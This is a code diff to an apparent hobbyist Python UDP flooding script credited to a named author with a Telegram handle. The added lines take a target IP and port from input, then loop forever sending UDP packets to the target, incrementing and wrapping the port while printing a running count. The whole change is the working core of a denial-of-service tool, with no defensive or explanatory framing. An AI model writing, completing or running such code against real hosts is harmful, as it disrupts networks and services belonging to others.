@@ -28,7 +28,7 @@ print('Author   : Vladimir Sokha')
 print('Telegram : @VSokha')
 print('')
 ip = input("IP Target : ")
-port = input("Port      : ")
+port = int(input("Port      : "))
 
 print("[                    ] 0% ")
 time.sleep(5)
@@ -39,3 +39,13 @@ time.sleep(5)
 print("[===============     ] 75%")
 time.sleep(5)
 print("[====================] 100%")
+time.sleep(1)
+sent = 0
+
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent " + str(sent) + " packet to " + ip + " throught port:" + str(port))
+     if port == 65534:
+       port = 1
